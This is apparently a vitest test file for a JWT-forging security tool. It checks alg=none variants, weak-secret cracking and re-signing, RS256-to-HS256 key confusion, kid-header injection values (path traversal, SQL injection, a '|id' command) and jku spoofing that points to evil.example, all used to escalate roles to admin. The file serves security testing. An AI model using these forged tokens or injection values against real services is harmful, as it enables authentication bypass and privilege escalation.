import { describe, it, expect } from "vitest";
import crypto from "node:crypto";
import { forgeJwt } from "./jwt-forge.mjs";

// ── Helpers ────────────────────────────────────────────────────────────────────

function b64url(s) {
  return Buffer.from(s).toString("base64url");
}

function makeToken(header, payload, signature = "") {
  return `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}.${signature}`;
}

function hmacSha256(input, secret) {
  return crypto.createHmac("sha256", secret).update(input).digest("base64url");
}

// Build a properly HS256-signed token with a known secret.
function signedToken(payload, secret, kid = undefined) {
  const header = kid != null ? { alg: "HS256", typ: "JWT", kid } : { alg: "HS256", typ: "JWT" };
  const h = b64url(JSON.stringify(header));
  const p = b64url(JSON.stringify(payload));
  const sig = hmacSha256(`${h}.${p}`, secret);
  return `${h}.${p}.${sig}`;
}

// ── forgeJwt — error cases ─────────────────────────────────────────────────────

describe("forgeJwt — error cases", () => {
  it("throws when token is empty or missing", () => {
    expect(() => forgeJwt({})).toThrow("token is required");
    expect(() => forgeJwt({ token: "" })).toThrow("token is required");
    expect(() => forgeJwt({ token: "   " })).toThrow("token is required");
  });

  it("throws when token has only one segment (header only)", () => {
    expect(() => forgeJwt({ token: b64url('{"alg":"HS256"}') })).toThrow("at least header.payload");
  });

  it("throws when header is not valid base64url JSON", () => {
    const bad = "not-json.eyJzdWIiOiIxIn0.sig";
    expect(() => forgeJwt({ token: bad })).toThrow("failed to decode JWT header");
  });

  it("throws when payload is not valid base64url JSON", () => {
    const goodHeader = b64url(JSON.stringify({ alg: "HS256" }));
    const bad = `${goodHeader}.not-json.sig`;
    expect(() => forgeJwt({ token: bad })).toThrow("failed to decode JWT payload");
  });

  it("throws when header decodes to a non-object (e.g. a string)", () => {
    const token = `${b64url('"just-a-string"')}.${b64url('{"sub":"1"}')}.sig`;
    expect(() => forgeJwt({ token })).toThrow("JWT header is not a JSON object");
  });
});

// ── forgeJwt — happy path: token structure ────────────────────────────────────

describe("forgeJwt — output structure (happy path)", () => {
  const token = makeToken({ alg: "HS256", typ: "JWT" }, { sub: "user1", role: "user" });

  it("returns schema, original, mutationsApplied, variants, boundary", () => {
    const result = forgeJwt({ token });
    expect(result.schema).toBe("agent-browser-runtime.jwt-forge.v1");
    expect(result.original).toBeDefined();
    expect(Array.isArray(result.mutationsApplied)).toBe(true);
    expect(Array.isArray(result.variants)).toBe(true);
    expect(typeof result.boundary).toBe("string");
  });

  it("original preserves header, payload, alg, signaturePresent", () => {
    const result = forgeJwt({ token });
    expect(result.original.header.alg).toBe("HS256");
    expect(result.original.payload.sub).toBe("user1");
    expect(result.original.alg).toBe("HS256");
    expect(result.original.signaturePresent).toBe(false); // empty sig segment
  });

  it("accepts tokens with only header.payload (no third segment)", () => {
    const twoSeg = `${b64url(JSON.stringify({ alg: "HS256" }))}.${b64url(JSON.stringify({ sub: "x" }))}`;
    expect(() => forgeJwt({ token: twoSeg })).not.toThrow();
  });
});

// ── forgeJwt — alg=none attack ────────────────────────────────────────────────

describe("forgeJwt — attack:none", () => {
  const token = makeToken({ alg: "HS256" }, { sub: "1", role: "user" });

  it("produces 3 variants (none/None/NONE spellings)", () => {
    const result = forgeJwt({ token, attacks: ["none"] });
    const noneVariants = result.variants.filter((v) => v.attack === "none");
    expect(noneVariants.length).toBe(3);
    const spellings = noneVariants.map((v) => v.header.alg);
    expect(spellings).toContain("none");
    expect(spellings).toContain("None");
    expect(spellings).toContain("NONE");
  });

  it("each none variant ends with a trailing dot (empty signature segment)", () => {
    const result = forgeJwt({ token, attacks: ["none"] });
    for (const v of result.variants) {
      expect(v.token).toMatch(/\.$/);
    }
  });

  it("none variants note the original alg", () => {
    const result = forgeJwt({ token, attacks: ["none"] });
    for (const v of result.variants) {
      expect(v.notes).toContain("HS256");
    }
  });

  it("payload mutations are applied inside none variants", () => {
    const result = forgeJwt({ token, attacks: ["none"], mutations: { role: "admin" } });
    for (const v of result.variants) {
      const parts = v.token.split(".");
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
      expect(payload.role).toBe("admin");
    }
  });
});

// ── forgeJwt — weak-secret attack ────────────────────────────────────────────

describe("forgeJwt — attack:weak-secret", () => {
  it("cracks known weak secret and notes it in the variant", () => {
    // "secret" is in DEFAULT_SECRET_WORDLIST
    const tok = signedToken({ sub: "user", role: "user" }, "secret");
    const result = forgeJwt({ tok, token: tok, attacks: ["weak-secret"] });
    const v = result.variants.find((x) => x.attack === "weak-secret");
    expect(v).toBeDefined();
    expect(v.notes).toContain('secret="secret"');
  });

  it("emits a candidate even when secret is not in wordlist (no-crack path)", () => {
    // Use a secret that's definitely not in the default wordlist
    const tok = signedToken({ sub: "user" }, "not-in-wordlist-xyz123");
    const result = forgeJwt({ token: tok, attacks: ["weak-secret"] });
    const v = result.variants.find((x) => x.attack === "weak-secret");
    expect(v).toBeDefined();
    expect(v.token).toBeTruthy();
    expect(v.notes).toContain("no match in wordlist");
  });

  it("re-signs with cracked secret + mutations applied to payload", () => {
    const tok = signedToken({ sub: "user", role: "user" }, "secret");
    const result = forgeJwt({ token: tok, attacks: ["weak-secret"], mutations: { role: "admin" } });
    const v = result.variants.find((x) => x.attack === "weak-secret");
    expect(v.notes).toContain('secret="secret"');
    // Verify the forged token's payload actually has role=admin
    const parts = v.token.split(".");
    const forgedPayload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
    expect(forgedPayload.role).toBe("admin");
  });

  it("handles unsigned token (no sig segment) without throwing", () => {
    const tok = makeToken({ alg: "HS256" }, { sub: "1" });
    expect(() => forgeJwt({ token: tok, attacks: ["weak-secret"] })).not.toThrow();
    const result = forgeJwt({ token: tok, attacks: ["weak-secret"] });
    const v = result.variants.find((x) => x.attack === "weak-secret");
    expect(v.notes).toContain("original token had no signature segment");
  });
});

// ── forgeJwt — hs-confusion attack ───────────────────────────────────────────

describe("forgeJwt — attack:hs-confusion", () => {
  it("skips (token=null) when publicKeyPem not provided", () => {
    const tok = makeToken({ alg: "RS256" }, { sub: "1" }, "fake-sig");
    const result = forgeJwt({ token: tok, attacks: ["hs-confusion"] });
    const v = result.variants.find((x) => x.attack === "hs-confusion");
    expect(v).toBeDefined();
    expect(v.token).toBeNull();
    expect(v.notes).toContain("publicKeyPem required");
  });

  it("builds HS256 variant using publicKeyPem as HMAC secret when provided", () => {
    const tok = makeToken({ alg: "RS256" }, { sub: "1" }, "fake-sig");
    const fakePem = "-----BEGIN PUBLIC KEY-----\nfakekey\n-----END PUBLIC KEY-----";
    const result = forgeJwt({ token: tok, attacks: ["hs-confusion"], publicKeyPem: fakePem });
    const v = result.variants.find((x) => x.attack === "hs-confusion");
    expect(v.token).toBeTruthy();
    expect(v.header.alg).toBe("HS256");
    expect(v.notes).toContain("RS256->HS256");
  });
});

// ── forgeJwt — kid-injection attack ──────────────────────────────────────────

describe("forgeJwt — attack:kid-injection", () => {
  it("produces 3 variants (path-traversal, sqli, command)", () => {
    const tok = makeToken({ alg: "HS256", kid: "key1" }, { sub: "1" }, "sig");
    const result = forgeJwt({ token: tok, attacks: ["kid-injection"] });
    const kids = result.variants.map((v) => v.attack === "kid-injection" && v.header.kid).filter(Boolean);
    expect(kids).toContain("../../../../dev/null");
    expect(kids).toContain("' OR '1'='1' -- ");
    expect(kids).toContain("|id");
  });

  it("keeps original sig segment in kid-injection variants", () => {
    const tok = makeToken({ alg: "HS256", kid: "key1" }, { sub: "1" }, "original-sig");
    const result = forgeJwt({ token: tok, attacks: ["kid-injection"] });
    for (const v of result.variants.filter((x) => x.attack === "kid-injection")) {
      expect(v.token).toMatch(/\.original-sig$/);
    }
  });
});

// ── forgeJwt — jku/x5u-spoof attacks ─────────────────────────────────────────

describe("forgeJwt — attack:jku-spoof and x5u-spoof", () => {
  const tok = makeToken({ alg: "RS256" }, { sub: "1" }, "sig");

  it("jku-spoof sets jku header to placeholder when no attackerJku", () => {
    const result = forgeJwt({ token: tok, attacks: ["jku-spoof"] });
    const v = result.variants.find((x) => x.attack === "jku-spoof");
    expect(v.header.jku).toContain("ATTACKER");
    expect(v.notes).toContain("placeholder");
  });

  it("jku-spoof uses attackerJku when provided", () => {
    const result = forgeJwt({ token: tok, attacks: ["jku-spoof"], attackerJku: "https://evil.example/jwks.json" });
    const v = result.variants.find((x) => x.attack === "jku-spoof");
    expect(v.header.jku).toBe("https://evil.example/jwks.json");
    expect(v.notes).not.toContain("placeholder");
  });

  it("x5u-spoof sets x5u header", () => {
    const result = forgeJwt({ token: tok, attacks: ["x5u-spoof"] });
    const v = result.variants.find((x) => x.attack === "x5u-spoof");
    expect(v.header.x5u).toBeDefined();
    expect(v.notes).toContain("x5u");
  });
});

// ── forgeJwt — attacks filter ─────────────────────────────────────────────────

describe("forgeJwt — attacks param filters variants", () => {
  const tok = makeToken({ alg: "HS256" }, { sub: "1" });

  it("only runs requested attacks", () => {
    const result = forgeJwt({ token: tok, attacks: ["none"] });
    const attackTypes = new Set(result.variants.map((v) => v.attack));
    expect(attackTypes.has("none")).toBe(true);
    expect(attackTypes.has("weak-secret")).toBe(false);
    expect(attackTypes.has("kid-injection")).toBe(false);
  });

  it("ignores unknown attack names silently (empty array case)", () => {
    const result = forgeJwt({ token: tok, attacks: ["totally-fake-attack"] });
    // All unknown attacks are filtered out → falls back to full default attacks
    expect(Array.isArray(result.variants)).toBe(true);
  });

  it("runs all attacks when attacks param is omitted", () => {
    const result = forgeJwt({ token: tok });
    const attackTypes = new Set(result.variants.map((v) => v.attack));
    expect(attackTypes.has("none")).toBe(true);
    expect(attackTypes.has("weak-secret")).toBe(true);
    expect(attackTypes.has("kid-injection")).toBe(true);
    expect(attackTypes.has("jku-spoof")).toBe(true);
    expect(attackTypes.has("x5u-spoof")).toBe(true);
  });
});

// ── forgeJwt — mutations ──────────────────────────────────────────────────────

describe("forgeJwt — mutations applied to payload", () => {
  const tok = makeToken({ alg: "HS256" }, { sub: "user", role: "user", iat: 1000 });

  it("records mutationsApplied list", () => {
    const result = forgeJwt({ token: tok, attacks: ["none"], mutations: { role: "admin", sub: "0" } });
    expect(result.mutationsApplied).toContain("role");
    expect(result.mutationsApplied).toContain("sub");
  });

  it("mutations override existing payload claims", () => {
    const result = forgeJwt({ token: tok, attacks: ["none"], mutations: { role: "admin" } });
    for (const v of result.variants.filter((x) => x.attack === "none")) {
      const parts = v.token.split(".");
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
      expect(payload.role).toBe("admin");
      expect(payload.sub).toBe("user"); // unchanged
    }
  });

  it("empty mutations leave payload unchanged", () => {
    const result = forgeJwt({ token: tok, attacks: ["none"], mutations: {} });
    expect(result.mutationsApplied).toEqual([]);
    for (const v of result.variants.filter((x) => x.attack === "none")) {
      const parts = v.token.split(".");
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
      expect(payload.role).toBe("user");
    }
  });
});
